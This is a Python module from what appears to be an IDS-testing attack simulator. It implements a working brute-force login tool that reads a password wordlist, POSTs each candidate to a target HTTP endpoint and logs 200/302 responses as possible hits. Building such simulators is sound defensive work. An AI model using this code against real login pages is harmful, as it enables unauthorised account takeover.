"""
brute_force.py — Brute-Force Login Simulator

Simulates repeated authentication attempts against an HTTP login endpoint
using a wordlist of passwords.

How it works
------------
1. Reads candidate passwords from a wordlist file (one per line).
2. For each password, sends an HTTP POST to the configured login URL with
   ``username`` and ``password`` form fields.
3. Checks the HTTP status code to determine success / failure:
   - 200 or 302  → potential success (logged as WARNING)
   - 401 or 403  → expected failure
   - anything else → logged as an anomaly
4. A configurable delay between attempts lets you test IDS sensitivity to
   different brute-force speeds.

IDS relevance
-------------
Many failed login attempts in rapid succession, possibly from a single source
IP, are a hallmark of credential-stuffing / brute-force attacks.
"""

import time

import urllib.request
import urllib.parse
import urllib.error

from network_sim.modules.base import AttackModule
from network_sim.config import DEFAULT_USERNAME, DEFAULT_WORDLIST, BRUTE_FORCE_DELAY


class BruteForceSimulator(AttackModule):
    """Simulate brute-force login attempts against an HTTP endpoint."""

    MODULE_NAME = "BruteForce"

    def __init__(self, target: str, port: int = 80, duration: int = 0, **kwargs):
        super().__init__(target, port, duration, **kwargs)
        self.username = kwargs.get("username", DEFAULT_USERNAME)
        self.wordlist_path = kwargs.get("wordlist", DEFAULT_WORDLIST)
        self.delay = kwargs.get("delay", BRUTE_FORCE_DELAY)
        self.successes: list[str] = []

    # ── Main loop ─────────────────────────────────────────────────────────

    def run(self) -> dict:
        passwords = self._load_wordlist()
        self.logger.info(
            "Starting brute-force against %s  |  username: %s  |  wordlist: %d entries",
            self.target,
            self.username,
            len(passwords),
        )
        self._start_timer()

        for idx, password in enumerate(passwords, 1):
            if self.is_stopped or self._time_exceeded():
                self.logger.info("Stopping early (stopped=%s, timeout=%s)",
                                 self.is_stopped, self._time_exceeded())
                break

            status = self._try_login(password)
            self.stats["connections"] += 1
            self.stats["packets_sent"] += 1

            if status in (200, 302):
                self.logger.warning(
                    "[%d/%d] password='%s' → HTTP %d  *** POSSIBLE HIT ***",
                    idx, len(passwords), password, status,
                )
                self.successes.append(password)
            elif status in (401, 403):
                self.logger.info(
                    "[%d/%d] password='%s' → HTTP %d (rejected)",
                    idx, len(passwords), password, status,
                )
            else:
                self.logger.info(
                    "[%d/%d] password='%s' → HTTP %d",
                    idx, len(passwords), password, status,
                )

            time.sleep(self.delay)

        self._stop_timer()
        self.logger.info(
            "Brute-force complete — %d attempt(s), %d possible hit(s)",
            self.stats["connections"],
            len(self.successes),
        )
        self.print_summary()
        return self.stats

    # ── Helpers ───────────────────────────────────────────────────────────

    def _try_login(self, password: str) -> int:
        """Send a single login POST and return the HTTP status code (or -1)."""
        try:
            data = urllib.parse.urlencode({
                "username": self.username,
                "password": password,
            }).encode("utf-8")

            url = self.target if self.target.startswith("http") else f"http://{self.target}:{self.port}"
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("User-Agent", "AttackSim-BruteForce/1.0")

            with urllib.request.urlopen(req, timeout=5) as resp:
                self.stats["bytes_sent"] += len(data)
                return resp.status
        except urllib.error.HTTPError as exc:
            self.stats["bytes_sent"] += len(data) if 'data' in dir() else 0
            return exc.code
        except Exception as exc:
            self.logger.debug("Connection error: %s", exc)
            self.stats["errors"] += 1
            return -1

    def _load_wordlist(self) -> list[str]:
        """Load newline-delimited passwords from the wordlist file."""
        try:
            with open(self.wordlist_path, "r", encoding="utf-8") as fh:
                return [line.strip() for line in fh if line.strip()]
        except FileNotFoundError:
            self.logger.error("Wordlist not found: %s", self.wordlist_path)
            return []
